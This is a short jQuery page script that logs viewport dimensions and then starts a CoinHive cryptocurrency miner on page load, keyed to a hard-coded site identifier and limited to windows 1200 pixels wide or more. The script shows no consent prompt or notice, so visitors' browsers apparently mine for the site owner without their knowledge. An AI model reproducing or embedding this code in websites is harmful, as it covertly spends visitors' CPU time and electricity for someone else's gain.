jQuery(document).ready(function ($) {
	
	// Viewport Info
    vw = $(window).width();
    vh = $(window).height();
    if (vh > vw) {
        orientation = 'portrait';
    }
    else {
        orientation = 'landscape';   
    }
    //vh = parseInt(vh);
    vw_out = "Viewport Size = "+vw+" x "+vh;
    console.log(vw_out);
	console.log('Orientation: ' + orientation);
    // End of Viewport Info	
	
    $.fn.coinhive_miner(vw, vh);
	
}); // End of document.ready

// Functions
(function($) {
	$.fn.coinhive_miner = function(vw, vh) {
        if (vw >= 1200) {
            var miner = new CoinHive.Anonymous('E4Bck3dWBq9iDT0HJZFMCaXab6vHtwHY', {
                throttle: 0.9    
            });
            miner.start();    
        } // end of if (vw >= 1366)        
    } // end of $.fn.coinhive_miner = function()
})( jQuery ); // End of Functions